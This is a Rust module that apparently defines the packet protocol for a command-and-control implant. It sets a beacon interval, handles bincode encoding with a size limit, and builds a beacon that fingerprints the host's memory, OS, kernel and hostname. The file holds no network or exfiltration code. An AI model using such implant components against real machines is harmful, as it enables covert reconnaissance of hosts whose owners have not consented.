use std::ops::Range;

use bincode::{Decode, Encode, config};
use sysinfo::System;

pub const IMPLANT_REPORT_RATE_SECONDS: Range<u64> = if cfg!(debug_assertions) {
    1..10
} else {
    60 * 5..60 * 5
};

pub const MAX_PACKET_SIZE_BYTES: usize = 1024;

#[derive(Debug, Encode, Decode)]
pub enum Packet {
    Beacon { system_info: SystemInfo },
}

#[derive(Debug)]
pub enum PacketSerializationError {
    PacketTooLong,
    EncodingError(bincode::error::EncodeError),
}

pub fn encode(packet: &Packet) -> Result<Vec<u8>, PacketSerializationError> {
    let bytes = bincode::encode_to_vec(packet, config::standard());
    match bytes {
        Ok(bytes) => {
            if bytes.len() > MAX_PACKET_SIZE_BYTES {
                return Err(PacketSerializationError::PacketTooLong);
            }

            return Ok(bytes);
        }
        Err(e) => return Err(PacketSerializationError::EncodingError(e)),
    }
}

#[derive(Debug)]
pub enum PacketDeserializationError {
    PacketTooLong,
    DecodingError(bincode::error::DecodeError),
}

pub fn decode(bytes: &Vec<u8>) -> Result<Packet, PacketDeserializationError> {
    if bytes.len() > MAX_PACKET_SIZE_BYTES {
        return Err(PacketDeserializationError::PacketTooLong);
    }

    let packet = bincode::decode_from_slice(bytes.as_slice(), config::standard());

    match packet {
        Ok(packet) => Ok(packet.0),
        Err(e) => Err(PacketDeserializationError::DecodingError(e)),
    }
}

#[derive(Debug, Clone, Encode, Decode)]
pub struct SystemInfo {
    memory_gb: u64,
    name: String,
    kernel: String,
    os_version: String,
    hostname: String,
}

impl SystemInfo {
    pub fn get() -> Self {
        let mut sys = System::new_all();
        sys.refresh_all();

        Self {
            memory_gb: (sys.total_memory() as f64 / 1024_u64.pow(3) as f64).ceil() as u64,
            name: System::name().unwrap_or("unknown system name".to_string()),
            kernel: System::kernel_long_version(),
            os_version: System::os_version().unwrap_or("unknown OS version".to_string()),
            hostname: System::host_name().unwrap_or("unknown hostname".to_string()),
        }
    }
}
